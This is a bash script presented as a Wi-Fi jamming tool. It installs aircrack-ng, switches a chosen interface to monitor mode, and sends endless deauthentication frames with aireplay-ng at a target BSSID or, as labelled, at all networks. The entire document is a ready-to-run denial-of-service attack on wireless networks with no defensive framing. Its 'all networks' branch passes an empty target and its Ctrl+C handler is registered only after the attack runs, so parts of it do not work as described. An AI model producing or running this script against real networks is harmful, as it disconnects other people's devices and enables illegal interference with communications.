#!/bin/bash

# Function to install aircrack-ng if not found
install_aircrack_ng() {
    if ! command -v airmon-ng &> /dev/null; then
        echo "[*] airmon-ng not found, installing..."
        sudo apt update
        sudo apt install aircrack-ng -y
    else
        echo "[*] airmon-ng is already installed."
    fi
}

# Function to start monitor mode using airmon-ng
start_airmon_ng() {
    echo "[*] Starting airmon-ng on $1..."
    sudo airmon-ng start $1
    sleep 2
    INTERFACE="$1mon"
    echo "[*] Interface set to $INTERFACE in monitor mode."
}

# Function to stop monitor mode and return to normal mode
stop_airmon_ng() {
    echo "[*] Stopping airmon-ng and returning to normal mode..."
    sudo airmon-ng stop $INTERFACE
    sudo ip link set $INTERFACE down
    sudo ip link set $INTERFACE up
    echo "[*] Interface $INTERFACE is back to normal mode."
}

# Function to send deauthentication frames to all clients
deauth_attack() {
    echo "[*] Starting Deauth attack..."
    sudo aireplay-ng --deauth 0 -a $1 $INTERFACE
}

# Script main menu
echo "====================================="
echo "   Wi-Fi Jamming with airmon-ng"
echo "====================================="
echo "[1] Start jamming with airmon-ng"
echo "[2] Exit"
echo "====================================="
read -p "Choose an option: " option

case $option in
    1)
        # Install aircrack-ng if not installed
        install_aircrack_ng
        read -p "Enter the wireless interface (e.g., wlan0): " interface
        sudo ip link set $interface up
        start_airmon_ng $interface
        read -p "Enter the target network's BSSID (MAC address) or leave blank for all: " bssid
        if [ -z "$bssid" ]; then
            # If no BSSID, perform deauth attack on all connected networks
            deauth_attack
        else
            # Perform deauth attack on the target network
            sudo aireplay-ng --deauth 0 -a $bssid $INTERFACE
        fi
        ;;
    2)
        echo "Exiting script."
        exit 0
        ;;
    *)
        echo "Invalid option. Exiting."
        exit 1
        ;;
esac

# Handling the Ctrl+C exit scenario
trap "echo 'Exiting script...'; stop_airmon_ng; exit 0" SIGINT
